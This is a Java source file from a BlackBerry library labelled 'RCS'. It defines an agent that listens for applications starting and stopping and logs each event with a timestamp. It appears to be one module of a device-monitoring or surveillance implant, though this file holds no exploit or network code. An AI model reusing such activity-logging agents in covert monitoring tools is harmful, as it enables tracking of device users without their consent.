/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ApplicationAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import java.util.Vector;

import blackberry.AppListener;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * log dei start e stop delle applicazioni
 */
public class ApplicationAgent extends Agent implements ApplicationListObserver {
	// #mdebug
	private static Debug debug = new Debug("ApplicationAgent",
			DebugLevel.VERBOSE);
	// #enddebug

	public int LOG_DELIMITER = 0xABADC0DE;

	boolean firstRun = true;

	public ApplicationAgent(final boolean agentStatus) {
		super(Agent.AGENT_APPLICATION, agentStatus, true, "ApplicationAgent");
	}

	protected ApplicationAgent(final boolean agentStatus,
			final byte[] confParams) {
		this(agentStatus);
		parse(confParams);
	}

	public void actualStart() {
		// #debug debug
		debug.trace("actualStart");
		firstRun = true;
		AppListener.getInstance().addApplicationListObserver(this);
	}

	public void actualStop() {
		// #debug debug
		debug.trace("actualStop");
		AppListener.getInstance().removeApplicationListObserver(this);
	}

	public void actualRun() {
		// #debug debug
		debug.trace("run");

	}

	protected boolean parse(final byte[] confParameters) {
		// #debug debug
		debug.trace("parse");
		return false;
	}

	public synchronized void onApplicationListChange(final Vector startedList,
			final Vector stoppedList) {

		// #ifdef DBC
		Check.requires(startedList != null, "startedList != null");
		Check.requires(stoppedList != null, "stoppedList != null");
		// #endif
		
		if (firstRun) {
			// #debug info
			debug.info("skipping first run");

			// #ifdef DBC
			Check.asserts(startedList.size() > 0, "startedList.size() > 0");
			Check.asserts(stoppedList.size() == 0, "stoppedList.size() == 0");
			// #endif

			firstRun = false;
			return;
		}
		
		log.createLog(null);

		int size = startedList.size();
		for (int i = 0; i < size; i++) {
			String appName = (String) startedList.elementAt(i);

			//#debug debug
			debug.trace(appName + " START");
			writeLog(appName, "START");
		}

		size = stoppedList.size();
		for (int i = 0; i < size; i++) {
			String appName = (String) stoppedList.elementAt(i);
			//#debug debug
			debug.trace(appName + " STOP");
			
			writeLog(appName,"STOP");
		}

		log.close();

		//#debug debug
		debug.trace("finished writing log");
	}

	private void writeLog(final String appName, final String condition) {
		byte[] tm = (new DateTime()).getStructTm();
					
		Vector items = new Vector();
		items.addElement(tm);
		items.addElement(WChar.getBytes(appName,true));
		items.addElement(WChar.getBytes(condition,true));
		items.addElement(WChar.getBytes("info",true));
		items.addElement(Utils.intToByteArray(LOG_DELIMITER));
		log.writeLogs(items);

	}
}
